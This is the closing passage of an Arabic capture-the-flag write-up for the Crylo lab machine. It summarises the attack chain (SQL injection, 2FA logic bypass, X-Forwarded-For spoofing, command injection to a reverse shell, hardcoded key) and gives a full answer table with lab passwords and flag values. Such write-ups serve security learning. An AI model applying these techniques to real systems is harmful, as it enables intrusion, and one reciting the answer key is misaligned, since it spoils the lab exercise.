* **Assessment & Conclusions**: دخلنا `/root` ولقينا ملف `flag.txt`، وقرينا محتواه وطلع **Root Flag**: `201ea4139d9755d6c9384783df06dc7e`، مطابق تماماً لإجابة Task 5 الأخيرة، وبكدا اكتملت الماشين بالكامل من الـ Recon لحد الـ Full System Compromise.

## Next Logical Step

لا يوجد — تم الحصول على أعلى صلاحية ممكنة (root) وتم استخراج كل الأعلام (Flags) المطلوبة.

---

# Assessment Summary

بعد اجتياز المراحل السبعة عشر دول، بقى واضح إن ماشين Crylo مبنية عشان توضّح فكرة أساسية جداً في أمن التطبيقات: **الاعتماد على أي حاجة عايشة في جانب الـ Client (Browser) — سواء تشفير أو Logic أو حتى الـ Headers — مش أمان حقيقي**. شفنا الفكرة دي بتتكرر بأكتر من شكل في نفس الماشين:

- **SQL Injection** كلاسيكي في فورم الـ Login أدى لتجاوز التحقق بالكامل واستخراج الداتابيز بأداة sqlmap.
- **Client-Side Encryption (CryptoJS)** اديت إحساس بالأمان لكن الـ Logic اللي بيقرر مسار الـ 2FA كان قابل للتلاعب بسهولة عن طريق التنقل المباشر بين الصفحات.
- **HTTP Header (`X-Forwarded-For`)** اتصدّق من السيرفر من غير تحقق حقيقي، وده فتح الباب لصفحة داخلية حساسة.
- **OS Command Injection** في أداة داخلية بسيطة (فحص بورتات) حوّلت من صفحة "غير ضارة" لـ Full Reverse Shell.
- وأخيراً **Custom Application-Level Encryption** بمفتاح ثابت جوه كود المصدر خلّت الباسورد "المُشفّر" في قاعدة البيانات قابل للفك بمجرد الوصول لكود السيرفر — ده بيأكد إن أي مفتاح تشفير مكتوب بشكل ثابت (Hardcoded) جوه الكود هو نقطة ضعف كارثية بمجرد ما حد يوصل لملفات المصدر.

---

# Room Tasks Summary

| Task | السؤال | الإجابة |
| --- | --- | --- |
| Task 1 | How many ports are open? | `2` |
| Task 1 | What is the 403/forbidden web page? | `/debug` |
| Task 2 | What is the name of the first username? | `admin` |
| Task 2 | What is the password for the above user? | `trigger` |
| Task 3 | Which library is used for encryption and decryption? | `CryptoJS` |
| Task 3 | Which JSON parameter was used to validate the pin? | `pin_set` |
| Task 3 | Which encryption method is used? | `AES` |
| Task 4 | What extra header can be used to bypass the page? | `X-Forwarded-For` |
| Task 4 | Which IP is allowed to access the page? | `127.0.0.1` |
| Task 5 | What is the name of the vulnerability used to gain system access? | `OS command injection` |
| Task 5 | What is the current system's username? | `crylo` |
| Task 5 | What is the user flag? | `fa3e352b00adf9d4e967ad0e34d5e59d` |
| Task 5 | Which user is part of the sudo group? | `anof` |
| Task 5 | What is the password for the above user? | `@Pass123@666666666` |
| Task 5 | What is the root flag? | `201ea4139d9755d6c9384783df06dc7e` |

---

# Flags

| Flag | Description | Value |
| --- | --- | --- |
| **User Flag** | `/home/crylo/user.txt` | `fa3e352b00adf9d4e967ad0e34d5e59d` |
| **Root Flag** | `/root/flag.txt` | `201ea4139d9755d6c9384783df06dc7e` |

<p align="center">
  <img src="Crylo-screens/Screenshot_2026-08-13_011923.png" width="600">
</p>

</div>
